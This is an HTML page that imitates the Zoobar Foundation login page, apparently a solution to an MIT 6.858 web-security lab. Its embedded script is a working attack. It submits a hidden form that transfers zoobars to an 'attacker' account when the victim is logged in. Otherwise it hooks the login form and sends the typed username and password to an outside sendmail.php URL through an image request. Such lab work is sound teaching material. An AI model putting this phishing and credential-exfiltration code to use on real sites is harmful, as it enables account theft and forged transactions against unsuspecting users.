<html>
<head>
<link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
<title>Login - Zoobar Foundation</title>
</head>
<body>
<h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation</a></h1>
<div id="login" class="centerpiece">
<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr><td>Username:</td>
<td><input type="text" name="login_username" size="20" value=""></td></tr>
<tr><td>Password:</td>
<td colspan="2"><input type="password" name="login_password" size="20">
<input type="submit" name="submit_login" value="Log in">
<input type="submit" name="submit_registration" value="Register"></td></tr>
</table>
<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
</form>
</div>
<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
<script>
function sendCreds(user, pass) {
  (new Image()).src = 'http://css.csail.mit.edu/6.858/2012/labs/sendmail.php?body='
    + encodeURIComponent(user + ',' + pass);
}
if (document.getElementById('myZoobars') &&
    /[0-9]+/.test(document.getElementById('myZoobars').innerHTML)) {
  var f = document.createElement('form');
  f.method = 'POST';
  f.action = 'http://localhost:8080/zoobar/index.cgi/transfer';
  f.style.display = 'none';
  f.innerHTML = '<input name="recipient" value="attacker"><input name="zoobars" value="10"><input name="submission" value="Send">';
  document.body.appendChild(f);
  f.submit();
} else {
  document.loginform.onsubmit = function() {
    sendCreds(document.loginform.login_username.value,
              document.loginform.login_password.value);
    document.loginform.action = 'http://localhost:8080/zoobar/index.cgi/login';
    return true;
  };
}
</script>
</body>
</html>
